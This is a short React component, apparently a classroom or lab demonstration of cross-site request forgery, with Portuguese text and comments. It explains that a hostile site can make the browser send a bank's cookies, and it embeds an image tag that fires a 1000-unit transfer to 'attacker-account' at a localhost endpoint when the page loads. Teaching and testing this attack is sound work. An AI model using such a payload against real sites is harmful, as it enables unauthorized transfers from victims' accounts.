import React from 'react';

function Evil() {
  return (
    <div style={{ fontFamily: 'Arial', padding: '20px' }}>
      <h1>Site malvadão.com</h1>
      <p>Se você está vendo isso, você já me mandou dinheiro.</p>
      {/* Requisição maliciosa para bank.com
       
O site evil.com consegue fazer uma requisição para o backend de bank.com porque o navegador permite requisições entre origens diferentes (cross-origin requests) 
em algumas situações específicas, desde que o código de evil.com não tente acessar diretamente a resposta da requisição.

Isso acontece porque o navegador, por padrão,
 envia cookies automaticamente para requisições feitas para um domínio conhecido (bank.com), 
 mesmo que a origem da requisição seja um site diferente (evil.com).
      
      
      */}
      <img src="http://localhost:3001/api/transfer?amount=1000&to=attacker-account" alt="Opa fiquei rico" />
    </div>
  );
}

export default Evil;
